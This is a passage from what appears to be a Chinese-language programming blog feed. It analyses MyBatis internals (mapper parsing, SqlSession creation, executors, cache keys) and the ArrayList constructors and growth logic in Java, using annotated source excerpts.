Resources.getResourceAsStream(resource);</span><br><span class="line">          <span class="type">XMLMapperBuilder</span> <span class="variable">mapperParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLMapperBuilder</span>(inputStream, configuration, resource, configuration.getSqlFragments());</span><br><span class="line">          mapperParser.parse();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resource == <span class="literal">null</span> &amp;&amp; url != <span class="literal">null</span> &amp;&amp; mapperClass == <span class="literal">null</span>) &#123;</span><br><span class="line">          ErrorContext.instance().resource(url);</span><br><span class="line">          <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getUrlAsStream(url);</span><br><span class="line">          <span class="type">XMLMapperBuilder</span> <span class="variable">mapperParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLMapperBuilder</span>(inputStream, configuration, url, configuration.getSqlFragments());</span><br><span class="line">          mapperParser.parse();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resource == <span class="literal">null</span> &amp;&amp; url == <span class="literal">null</span> &amp;&amp; mapperClass != <span class="literal">null</span>) &#123;</span><br><span class="line">          Class&lt;?&gt; mapperInterface = Resources.classForName(mapperClass);</span><br><span class="line">          configuration.addMapper(mapperInterface);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BuilderException</span>(<span class="string">&quot;A mapper element may only specify a url, resource or class, but not more than one.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-SqlSession的创建"><a href="#2-2-SqlSession的创建" class="headerlink" title="2.2 SqlSession的创建"></a>2.2 SqlSession的创建</h2><h3 id="2-2-1-调用链"><a href="#2-2-1-调用链" class="headerlink" title="2.2.1 调用链"></a>2.2.1 调用链</h3><p><img src="/../img/202205121053486.png" alt="image-20220512105328394"></p>
<p>mybatis提供了四种执行器（Executor），分别为：SimpleExecutor（默认）、ReuseExecutor（可复用，只预编译一次sql，省去了statement创建）、BatchExecutor（批处理）、CachingExecutor（二级缓存时使用）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> SqlSession <span class="title function_">openSessionFromDataSource</span><span class="params">(ExecutorType execType, TransactionIsolationLevel level, <span class="type">boolean</span> autoCommit)</span> &#123;</span><br><span class="line">  <span class="type">Transaction</span> <span class="variable">tx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Environment</span> <span class="variable">environment</span> <span class="operator">=</span> configuration.getEnvironment();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">TransactionFactory</span> <span class="variable">transactionFactory</span> <span class="operator">=</span> getTransactionFactoryFromEnvironment(environment);</span><br><span class="line">    tx = transactionFactory.newTransaction(environment.getDataSource(), level, autoCommit);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Executor</span> <span class="variable">executor</span> <span class="operator">=</span> configuration.newExecutor(tx, execType);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultSqlSession</span>(configuration, executor, autoCommit);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    closeTransaction(tx); <span class="comment">// may have fetched a connection so lets call close()</span></span><br><span class="line">    <span class="keyword">throw</span> ExceptionFactory.wrapException(<span class="string">&quot;Error opening session.  Cause: &quot;</span> + e, e);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ErrorContext.instance().reset();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-分析selectOne方法"><a href="#2-3-分析selectOne方法" class="headerlink" title="2.3 分析selectOne方法"></a>2.3 分析selectOne方法</h2><h3 id="2-3-1-前言：四大对象"><a href="#2-3-1-前言：四大对象" class="headerlink" title="2.3.1 前言：四大对象"></a>2.3.1 前言：四大对象</h3><p>Executor：负责增删改查的方法调度。mybatis提供了四个实现，SimpleExecutor（默认）、ReuseExecutor（可复用，只预编译一次sql）、BatchExecutor（批处理）、CachingExecutor（二级缓存时使用）</p>
<p>StatementHandler：处理statement，提供了三个实现，SimpleStatementHandler、PreparedStatementHandler（预编译sql）、CallableStatementHandler（调用的是CallableStatement来执行存储过程）和RoutingStatementHandler，RoutingStatementHandler其实是根据statementType的不同，路由到前三者中的一种。</p>
<p>ParameterHandler：提供了一个实现DefaultParameterHandler，用于处理sql上的参数</p>
<p>ResultSetHandler：提供了一个默认的实现DefaultResultSetHandler，用于处理数据库类型、字段与java的类型、属性之间的映射关系</p>
<h3 id="2-3-2-调用链"><a href="#2-3-2-调用链" class="headerlink" title="2.3.2 调用链"></a>2.3.2 调用链</h3><pre><code>  at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.applyAutomaticMappings(DefaultResultSetHandler.java:561)
  at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.getRowValue(DefaultResultSetHandler.java:402)
  at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleRowValuesForSimpleResultMap(DefaultResultSetHandler.java:354)
  at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleRowValues(DefaultResultSetHandler.java:328)
  at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleResultSet(DefaultResultSetHandler.java:301)
  at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleResultSets(DefaultResultSetHandler.java:194)
  at org.apache.ibatis.executor.statement.PreparedStatementHandler.query(PreparedStatementHandler.java:65)
  at org.apache.ibatis.executor.statement.RoutingStatementHandler.query(RoutingStatementHandler.java:79)
  at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:63)
  at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:325)
  at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156)
  at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109)
  at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:89)
  at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:147)
  at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140)
  at org.apache.ibatis.session.defaults.DefaultSqlSession.selectOne(DefaultSqlSession.java:76)
  at com.zhifei.Application.main(Application.java:30)
</code></pre>
<h4 id="2-3-2-1-query"><a href="#2-3-2-1-query" class="headerlink" title="2.3.2.1 query"></a>2.3.2.1 query</h4><pre><code>at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:89)
</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">query</span><span class="params">(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  <span class="type">BoundSql</span> <span class="variable">boundSql</span> <span class="operator">=</span> ms.getBoundSql(parameterObject);</span><br><span class="line">  <span class="type">CacheKey</span> <span class="variable">key</span> <span class="operator">=</span> createCacheKey(ms, parameterObject, rowBounds, boundSql);</span><br><span class="line">  <span class="keyword">return</span> query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一级缓存键的组成：statementId、offset、limit、sql(带?的sql)、参数值、环境变量（这里的是dev）</p>
<blockquote>
<p>eg:<br>801103762:4199634023:com.zhifei.mapper.BookMapper.getById:0:2147483647:select<br>id, create_time AS createTime, update_time AS updateTime<br>        from t_book where id &#x3D; ?:1:dev</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> CacheKey <span class="title function_">createCacheKey</span><span class="params">(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (closed) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExecutorException</span>(<span class="string">&quot;Executor was closed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">CacheKey</span> <span class="variable">cacheKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CacheKey</span>();</span><br><span class="line">  cacheKey.update(ms.getId());</span><br><span class="line">  cacheKey.update(rowBounds.getOffset());</span><br><span class="line">  cacheKey.update(rowBounds.getLimit());</span><br><span class="line">  cacheKey.update(boundSql.getSql());</span><br><span class="line">  List&lt;ParameterMapping&gt; parameterMappings = boundSql.getParameterMappings();</span><br><span class="line">  <span class="type">TypeHandlerRegistry</span> <span class="variable">typeHandlerRegistry</span> <span class="operator">=</span> ms.getConfiguration().getTypeHandlerRegistry();</span><br><span class="line">  <span class="comment">// mimic DefaultParameterHandler logic</span></span><br><span class="line">  <span class="keyword">for</span> (ParameterMapping parameterMapping : parameterMappings) &#123;</span><br><span class="line">    <span class="keyword">if</span> (parameterMapping.getMode() != ParameterMode.OUT) &#123;</span><br><span class="line">      Object value;</span><br><span class="line">      <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> parameterMapping.getProperty();</span><br><span class="line">      <span class="keyword">if</span> (boundSql.hasAdditionalParameter(propertyName)) &#123;</span><br><span class="line">        value = boundSql.getAdditionalParameter(propertyName);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (parameterObject == <span class="literal">null</span>) &#123;</span><br><span class="line">        value = <span class="literal">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) &#123;</span><br><span class="line">        value = parameterObject;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">MetaObject</span> <span class="variable">metaObject</span> <span class="operator">=</span> configuration.newMetaObject(parameterObject);</span><br><span class="line">        value = metaObject.getValue(propertyName);</span><br><span class="line">      &#125;</span><br><span class="line">      cacheKey.update(value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (configuration.getEnvironment() != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// issue #176</span></span><br><span class="line">    cacheKey.update(configuration.getEnvironment().getId());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cacheKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-3-2-2-queryFromDatabase"><a href="#2-3-2-2-queryFromDatabase" class="headerlink" title="2.3.2.2 queryFromDatabase"></a>2.3.2.2 queryFromDatabase</h4><pre><code>at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:325)
</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">queryFromDatabase</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  List&lt;E&gt; list;</span><br><span class="line">  localCache.putObject(key, EXECUTION_PLACEHOLDER);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    localCache.removeObject(key);</span><br><span class="line">  &#125;</span><br><span class="line">  localCache.putObject(key, list);</span><br><span class="line">  <span class="keyword">if</span> (ms.getStatementType() == StatementType.CALLABLE) &#123;</span><br><span class="line">    localOutputParameterCache.putObject(key, parameter);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-3-2-3-doQuery"><a href="#2-3-2-3-doQuery" class="headerlink" title="2.3.2.3 doQuery"></a>2.3.2.3 doQuery</h4><pre><code>  at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:63)
</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="title function_">doQuery</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> ms.getConfiguration();</span><br><span class="line">    <span class="comment">// 在这行代码下面根据StatementType去创建对应的StatementHandler，并在底层添加了parameterHandler、resultSetHandler</span></span><br><span class="line">    <span class="type">StatementHandler</span> <span class="variable">handler</span> <span class="operator">=</span> configuration.newStatementHandler(wrapper, ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">    stmt = prepareStatement(handler, ms.getStatementLog());</span><br><span class="line">    <span class="keyword">return</span> handler.query(stmt, resultHandler);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    closeStatement(stmt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据StatementType去创建对应的StatementHandler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RoutingStatementHandler</span><span class="params">(Executor executor, MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (ms.getStatementType()) &#123;</span><br><span class="line">    <span class="keyword">case</span> STATEMENT:</span><br><span class="line">      delegate = <span class="keyword">new</span> <span class="title class_">SimpleStatementHandler</span>(executor, ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> PREPARED:</span><br><span class="line">      delegate = <span class="keyword">new</span> <span class="title class_">PreparedStatementHandler</span>(executor, ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> CALLABLE:</span><br><span class="line">      delegate = <span class="keyword">new</span> <span class="title class_">CallableStatementHandler</span>(executor, ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExecutorException</span>(<span class="string">&quot;Unknown statement type: &quot;</span> + ms.getStatementType());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加parameterHandler、resultSetHandler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">BaseStatementHandler</span><span class="params">(Executor executor, MappedStatement mappedStatement, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.configuration = mappedStatement.getConfiguration();</span><br><span class="line">  <span class="built_in">this</span>.executor = executor;</span><br><span class="line">  <span class="built_in">this</span>.mappedStatement = mappedStatement;</span><br><span class="line">  <span class="built_in">this</span>.rowBounds = rowBounds;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.typeHandlerRegistry = configuration.getTypeHandlerRegistry();</span><br><span class="line">  <span class="built_in">this</span>.objectFactory = configuration.getObjectFactory();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (boundSql == <span class="literal">null</span>) &#123; <span class="comment">// issue #435, get the key before calculating the statement</span></span><br><span class="line">    generateKeys(parameterObject);</span><br><span class="line">    boundSql = mappedStatement.getBoundSql(parameterObject);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.boundSql = boundSql;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.parameterHandler = configuration.newParameterHandler(mappedStatement, parameterObject, boundSql);</span><br><span class="line">  <span class="built_in">this</span>.resultSetHandler = configuration.newResultSetHandler(executor, mappedStatement, rowBounds, parameterHandler, resultHandler, boundSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-3-2-4-applyAutomaticMappings"><a href="#2-3-2-4-applyAutomaticMappings" class="headerlink" title="2.3.2.4 applyAutomaticMappings"></a>2.3.2.4 applyAutomaticMappings</h4><pre><code>  at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.applyAutomaticMappings(DefaultResultSetHandler.java:561)
</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">applyAutomaticMappings</span><span class="params">(ResultSetWrapper rsw, ResultMap resultMap, MetaObject metaObject, String columnPrefix)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">  List&lt;UnMappedColumnAutoMapping&gt; autoMapping = createAutomaticMappings(rsw, resultMap, metaObject, columnPrefix);</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">foundValues</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (!autoMapping.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (UnMappedColumnAutoMapping mapping : autoMapping) &#123;</span><br><span class="line">    	<span class="comment">// 结果集有几个字段循环几次，这里获取每个字段的值</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> mapping.typeHandler.getResult(rsw.getResultSet(), mapping.column);</span><br><span class="line">      <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">        foundValues = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (value != <span class="literal">null</span> || (configuration.isCallSettersOnNulls() &amp;&amp; !mapping.primitive)) &#123;</span><br><span class="line">        <span class="comment">// gcode issue #377, call setter on nulls (value is not &#x27;found&#x27;)</span></span><br><span class="line">        metaObject.setValue(mapping.property, value);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> foundValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-4-调用流程图"><a href="#2-4-调用流程图" class="headerlink" title="2.4 调用流程图"></a>2.4 调用流程图</h2><p><img src="/../img/202205121138208.jpg" alt="mybatis流程图"></p>
]]></content>
      <categories>
        <category>源码分析</category>
        <category>MyBatis</category>
      </categories>
      <tags>
        <tag>源码分析</tag>
        <tag>MyBatis</tag>
      </tags>
  </entry>
  <entry>
    <title>ArrayList源码分析</title>
    <url>/2022/12/02/$ArrayList%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="1-new-ArrayList"><a href="#1-new-ArrayList" class="headerlink" title="1. new ArrayList()"></a>1. new ArrayList()</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 无参构造，默认为空Object数组，首次add时，会扩容为默认容器大小10</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_CAPACITY</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认为空Object数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 集合内部的数据结构为Object数组</span></span><br><span class="line"><span class="keyword">transient</span> Object[] elementData;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 集合大小（数组包含的元素个数）</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ArrayList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-new-ArrayList-int-initialCapacity"><a href="#2-new-ArrayList-int-initialCapacity" class="headerlink" title="2. new ArrayList(int initialCapacity)"></a>2. new ArrayList(int initialCapacity)</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定容器大小为0时的空数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ArrayList</span><span class="params">(<span class="type">int</span> initialCapacity)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 容器初始化大小 &gt; 0，则初始化为指定大小</span></span><br><span class="line">        <span class="built_in">this</span>.elementData = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (initialCapacity == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 等于0，则引用静态的Object类型的空数组</span></span><br><span class="line">        <span class="built_in">this</span>.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 小于0，抛出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal Capacity: &quot;</span>+</span><br><span class="line">                                           initialCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-new-ArrayList-Collection-c"><a href="#3-new-ArrayList-Collection-c" class="headerlink" title="3. new ArrayList(Collection&lt;? extends E&gt; c)"></a>3. new ArrayList(Collection&lt;? extends E&gt; c)</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ArrayList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> &#123;</span><br><span class="line">    elementData = c.toArray();</span><br><span class="line">    <span class="keyword">if</span> ((size = elementData.length) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// c.toArray might (incorrectly) not return Object[] (see 6260652)</span></span><br><span class="line">        <span class="keyword">if</span> (elementData.getClass() != Object[].class)</span><br><span class="line">            <span class="comment">// 指定的集合不为空，且返回类型不是Object数组，重新构建相同长度的Object数组</span></span><br><span class="line">            elementData = Arrays.copyOf(elementData, size, Object[].class);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// replace with empty array.</span></span><br><span class="line">        <span class="built_in">this</span>.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java.util.Arrays#copyOf(U[], int, java.lang.Class&lt;? extends T[]&gt;)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T,U&gt; T[] copyOf(U[] original, <span class="type">int</span> newLength, Class&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>[]&gt; newType) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    T[] copy = ((Object)newType == (Object)Object[].class)</span><br><span class="line">        ? (T[]) <span class="keyword">new</span> <span class="title class_">Object</span>[newLength]</span><br><span class="line">        : (T[]) Array.newInstance(newType.getComponentType(), newLength);</span><br><span class="line">    <span class="comment">// 数组元素复制</span></span><br><span class="line">    System.arraycopy(original, <span class="number">0</span>, copy, <span class="number">0</span>,</span><br><span class="line">                     Math.min(original.length, newLength));</span><br><span class="line">    <span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java.lang.System#arraycopy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组元素复制：把src从下标srcPos开始复制到从下标destPos开始的dest数组中，复制长度为length</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">arraycopy</span><span class="params">(Object src,  <span class="type">int</span>  srcPos,</span></span><br><span class="line"><span class="params">                                        Object dest, <span class="type">int</span> destPos,</span></span><br><span class="line"><span class="params">                                        <span class="type">int</span> length)</span>;</span><br></pre></td></tr></table></figure>

<h1 id="4-add-E-e"><a href="#4-add-E-e" class="headerlink" title="4. add(E e)"></a>4. add(E e)</h1><p>以无参构造创建的ArrayList对象为例进行add：</p>
<p>​		添加元素时，先计算实际所需的容器大小的最小值，如果数组为初始化时的空数组，则容器大小为默认值10；然后增加一次list的修改次数，判断实际所需的容器大小最小值是否超出了当前数组的长度；如果是，则扩容。新容器大小为 <code>数组长度 + 数组长度/2</code> ，如果新容器大小比实际所需的要小，则扩容后大小为实际所需的大小（例如：不指定容器大小初始化后的首次插入元素），如果比 <code>MAX_ARRAY_SIZE</code> 大，则新容器最大为Integer的最大值2^31-1。扩容完（或不需要扩容）后，在数组最后插入元素，最后size+1。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 结构修改的次数（引发集合大小size改变的修改次数）</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> <span class="type">int</span> <span class="variable">modCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">    <span class="comment">// 在数组最后插入新元素，容器大小+1</span></span><br><span class="line">    elementData[size++] = e;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensureCapacityInternal</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算所需要容量大小（的最小值）：若当前为默认空数组，则容量大小为默认大小10或实际所需大小的较大值；若不是默认空数组，即容量大小为所需大小</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">calculateCapacity</span><span class="params">(Object[] elementData, <span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.max(DEFAULT_CAPACITY, minCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minCapacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensureExplicitCapacity</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="comment">// 结构修改次数+1</span></span><br><span class="line">    modCount++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="comment">// 容器大小 &gt; 数组长度，需要扩容（扩的是Object数组的长度）</span></span><br><span class="line">    <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">        grow(minCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大数组大小：（2的31次方-1） - 8</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_ARRAY_SIZE</span> <span class="operator">=</span> Integer.MAX_VALUE - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> elementData.length;</span><br><span class="line">    <span class="comment">// 新容器大小为：旧数组长度 + 旧数组长度/2（向下取整），即旧数组长度*1.5（向下取整）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 新容器大小 &lt; 所需大小，则新容器大小设为所需大小</span></span><br><span class="line">    <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = minCapacity;</span><br><span class="line">    <span class="comment">// 新容器大小 &gt; 最大数组大小，则新容器大小设为Integer.MAX_VALUE或MAX_ARRAY_SIZE，具体看hugeCapacity方法</span></span><br><span class="line">    <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = 